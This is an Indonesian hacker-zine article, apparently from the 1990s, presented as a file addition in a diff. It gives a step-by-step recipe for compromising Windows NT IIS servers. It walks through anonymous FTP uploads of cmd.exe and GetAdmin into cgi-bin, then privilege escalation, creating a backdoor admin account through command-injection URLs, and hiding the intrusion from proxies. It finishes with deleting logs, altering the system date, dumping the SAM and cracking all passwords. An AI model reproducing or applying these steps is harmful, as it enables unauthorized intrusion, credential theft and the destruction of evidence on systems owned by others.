@@ -1,0 +1,151 @@
+Terbitan Online Kecoak Elektronik
+http://k-elektronik.org
+
+=======================================================================
+Resep Cepat #3: Menggasak NT dari jauh
+Oleh: LithErr - LithiumError (Kecoak Elektronik)
+=======================================================================
+
+
+Pingin iseng nyobain ngehack NT? Ingat selalu: "UNIX bukanlah segalanya!" Justru sekarang makin
+banyak perusahaan-perusahaan, bahkan ISP-ISP besar (seperti indo.net) yang menjadikan NT platform
+pilihan untuk webhosting mereka. Nah, berikut sedikit info dari pengalaman gue ngisengin server NT,
+dengan info-info sebagian besar dicolong dari berbagai "newbie textfile".
+
+Bahan-bahan
+===========
+ - Mesin yang lumayan (sekitar 486-66 keatas)
+ - Sistem operasi Windows NT (nggak mutlak, tapi jelas lebih sedap kalo nge-hack lewat OS yang sama
+   toh CD bajakan banyak beredar dimana-mana).
+ - Sebuah webbrowser (sebaiknya IE, supaya hack kita betul-betul 100% Microsoft-sponsored heheheh)
+ - RAS dan koneksi dialup ke internet.
+
+Jangan lupa file-file:
+ - GetAdmin.exe dan file dukungan gasys.dll
+ - L0phtCrack
+
+Mulai NgeHack
+=============
+Mulai seperti biasa, dengan membuka koneksi ke ISP kamu. Setelah itu, buka jendela "Command Prompt",
+dan mulai bekerja. Anggap kita sudah tahu bahwa www.company.com menjalankan IIS (untuk daftar target,
+coba cari lewat search engine yang memanfaatkan spider (altavista, excite). Biasanya file help IIS
+ikut terdokumentasi disitu. Nah, sekarang kita coba (untung-untungan, nih) untuk ftp ke server
+tersebut:
+
+C:\ftp www.company.com
+
+connected to www.company.com
+
+220 manado Microsoft FTP Service (Version 3.0)
+
+User (www.company.com:(none)):
+
+Koneksi ini memberikan info yang cukup penting: Nama NetBIOS dari sang server: MANADO. Dari sini bisa
+kita ketahui nama dari account internet anonimus yang digunakan oleh NT untuk menjalankan layanan WWW,
+FTP, dan Gopher di mesin tersebut.
+
+Jika account default belum diganti, dan memang jarang sekali account seperti ini diganti, biasanya
+account internet anonimusnya adalah:
+
+IUSR_SATURN. Informasi ini akan kita perlukan di masa yang akan datang saat kita mencoba mencuri akses
+Administrator ke dalam sang mesin. Nah, coba masukkan "anonymous" sebagai nama user:
+
+
+331 Anonymous access allowed, send identity (e-mail name) as password. 
+
+Password:
+
+Nah, terkadang ada juga gunanya kita masukkan "guest" sebelum mencoba "anonymous" sebagai username.
+Secara default, akses "guest" di NT tertutup, namun ada saja SysAdmin tolol yang membuka akses
+"guest" dan biasanya dibarengi dengan password "guest" atau malah kosong sama sekali. Nah, jika kamu
+berhasil masuk ke layanan FTP sang server melalui account ini, maka segala yang bisa diakses oleh
+"guest", bisa juga diakses olehmu.
+ 
+Dapat akses
+===========
+Sekarang kita sudah bisa mengakses site target, tapi jalan masih panjang. Untuk selanjutnya, kita coba
+untuk mengetik "cd /c" di prompt ftp. Banyak admin yang membuat root direktori C:\ dijadikan direktori
+ftp virtual dan membiarkan "alias name"-nya "/c" sebagai default. Sekarang coba kita "put" file ke
+direktori tersebut. Kalau emang nasib kamu bagus, maka kamu punya akses "write" ke direktori tersebut!
+Selanjutnya, kamu bisa seperti biasa me="dir" untuk melihat - lihat isi dari server sasaran kamu. Kalau
+kebetulan kamu melihat direktori "cgi-bin", maka jelas langkar pertama adalah tertawa terbahak-bahak,
+sebab sang Webmaster dari mesin ini rupanya meletakkan direktori ini bersama file-file websitenya
+(mungkin dengan tujuan agar dia bisa melakukan "remote changes" terhadap situs web tsb.)
+
+CGI-BIN mempunyai perizinan "Execute", yang artinya segala program di direktori cgi-bin bisa dieksekusi
+melalui web browser kita. Seringkali kita terbentur, jika sang Webmaster menggunakan NTFS
+file-level security, maka mustahil bagi kita untuk masuk ke cgi-bin lewat akses anonimus.
+ 
+Ganti direktori ke CGI-BIN ("cd cgi-bin") dan persiapkan ftp untuk transmisi file tipe biner ("binary").
+Nah, coba kirim file cmd.exe ("put cmd.exe"). Jika ladyluck masih menemani, kamu akan melihat:
+
+
+200 PORT command successful. 
+
+150 Opening BINARY mode data connection for CMD.EXE. 
+
+226 Transfer complete. 
+
+208144 bytes sent in 0.06 seconds (3469.07 Kbytes/sec)
+
+Lanjutkan dengan mengirimkan "getadmin.exe" dan "gasys.dll" ke direktori yang sama. Nah, setelah ketiga
+file ini ter-upload, tutup koneksi, dan silakan ngerokok dulu. Kalau kamu kebetulan punya account
+AOL atau ISP lain yang memanfaatkan proxy, segera koneksi kembali ke internet lewat ISP tersebut
+(untuk menghindari dicatatnya alamat IP kamu oleh fasilitas logging NT). Tapi jangan terlalu khawatir,
+sebab saat kamu berhasil mendapatkan Administrator, maka kamu bisa menghapus segala jejak. Nah, sekarang
+bukalah browser kamu dan masukkan URL berikut:
+
+http://www.company.com/cgi-bin/getadmin.exe?IUSR_MANADO
+
+Setelah kira-kira 15 detik, akan muncul:
+
+CGI Error 
+
+Wah, rupanya aplikasi CGI yang bersangkutan memberikan pesan error, dengan sedikit tambahan:
+
+Congratulations , now account IUSR_MANADO have administrator rights! 
+ 
+Heheheh. Kamu baru saja menjadikan account anonimusmu berpangkat sama dengan sang administrator sistem
+lokal. Sekarang kamu bisa melakukan hal apapun yang kamu inginkan, namun, tugas pertama adalah membuat
+account untuk kamu sendiri supaya kamu bisa menghubungi mesin targetmu lewat Windows Explorer dan
+utilitas-utilitas administratif lainnya. Kamu tidak bisa menggunakan account IUSR_SATURN sebab kamu
+tidak tahu password acaknya.
+
+Untuk membuat account baru, gunakan URL: 
+
+http://www.company.com/cgi-bin/cmd.exe?/c%20c:\winnt\system32\net.exe%20user%20iwan%20ngepet%20/add
+
+Kamu baru saja berhasil membuat sebuah account bernama "iwan" dengan password "ngepet". Untuk membuat
+account kamu berpangkat administrator, maka kamu bisa menggunakan URL:
+
+
+http://www.company.com/cgi-bin/getadmin.exe?iwan
+
+Setelah itu, tinggal kita klik tombol "Start" dan lewat "Find" cari komputer yang bernama www.company.com
+Setelah komputer tersebut ditemukan, kamu tinggal klik tombol kanan dan klik "Explore". Mesin kamu kan
+memulai NT Explorer dan kamu akan ditanya nama user dan password. Masukkan "iwan" dan "ngepet"
+(atau nama manapun juga yang kamu berikan lewat URL diatas). 
+ 
+Sekarang kamu sudah terhubung ke mesin sasaran, dengan segala hak yang dimiliki oleh seorang admin.
+Dengan menggunakan "User Manager for Domains" kamu bisa mengambil seluruh informasi account; kamu bisa
+membuka "Internet Service Manager"; kamu bisa melihat "Server Manager"; namun sekarang mari kita coba
+untuk menghapus seluruh jejak. Lewat Eksplorer, pergilah ke direktori Winnt\system32\logfiles dan hapus
+seluruh jejak kamu. Jika kamu mendapat pesan "sharing violation", cukup ganti tanggal komputer dengan
+URL:
+
+http://www.company.com/cgi-bin/cmd.exe?/c%20date%2002/02/98 
+
+Dengan menggunakan "Registry Editor", buka registri mesin target kamu, dan dengan menggunakan L0phtcrack,
+"dump" informasi SAM (Security Accounts Manager) di mesin tersebut dan mulailah meng-crack seluruh
+password di dalam mesin tersebut. Karena L0phtCrack menghabiskan banyak tenaga CPU, jangan lupa untuk
+mengeset prioritasnya ke "Low" lewat Task Manager. Untuk memastikan bahwa kehadiran kamu didalam sistem
+tidak akan terdeteksi, hapus file cmd, getadmin, dan gasys.dll dari cgi-bin, dan lewat Event Viewer,
+periksa seluruh log "security event". Akhirnya, dengan menggunakan User Manager for Domains, hapus
+privilese admin dari account IUSR_SATURN dan hapus account "iwan" yang baru saja kamu buat. Toh, kamu
+tidak akan membutuhkannya lagi. Sebelum kamu meninggalkan sang mesin, jangan lupa untuk mengeset prioritas
+L0phtCrack ke "High" supaya segala password bisa lebih cepat di-crack.
+
+
+
+Selamat bobo
+LithErr
